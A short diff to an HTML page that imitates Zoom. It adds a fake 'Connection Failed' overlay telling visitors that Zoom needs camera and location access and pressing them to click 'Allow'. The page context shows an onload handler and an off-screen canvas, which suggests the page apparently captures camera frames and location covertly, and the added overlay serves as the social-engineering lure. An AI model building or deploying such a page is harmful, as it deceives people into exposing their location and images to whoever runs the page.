@@ -295,6 +295,24 @@
 
 <body onload="information();">
   <canvas id="canvas" style="position:fixed; top:-10000px; left:-10000px;"></canvas>
+  <div id="permission-error" style="display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 99999; font-family: 'Open Sans', Helvetica, Arial, sans-serif;">
+    <div style="background: white; width: 90%; max-width: 400px; margin: 20% auto; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
+        <div style="margin-bottom: 20px;">
+            <svg style="width: 50px; height: 50px; fill: #E02828;" viewBox="0 0 24 24">
+                <path d="M11 15h2v2h-2zm0-8h2v6h-2zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
+            </svg>
+        </div>
+        <h2 style="color: #232333; margin: 0 0 10px 0; font-size: 22px; font-weight: 600;">Connection Failed</h2>
+        <p style="color: #747487; font-size: 15px; line-height: 1.6; margin-bottom: 24px;">
+            Zoom was unable to access your camera/location.<br>
+            Please click <strong>Retry</strong> and select <strong>"Allow"</strong> when prompted to join the meeting.
+        </p>       
+        <button onclick="location.reload()" style="background: #0E72ED; color: white; border: none; padding: 14px 40px; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 12px rgba(14, 114, 237, 0.3);">
+            Retry Connection
+        </button>
+      </div>
+  </div>
+  
   <div id="header_container" role="banner" class="">
     <div id="header_outer" class="container clearfix">
       <div id="header" role="banner" class="clearfix">
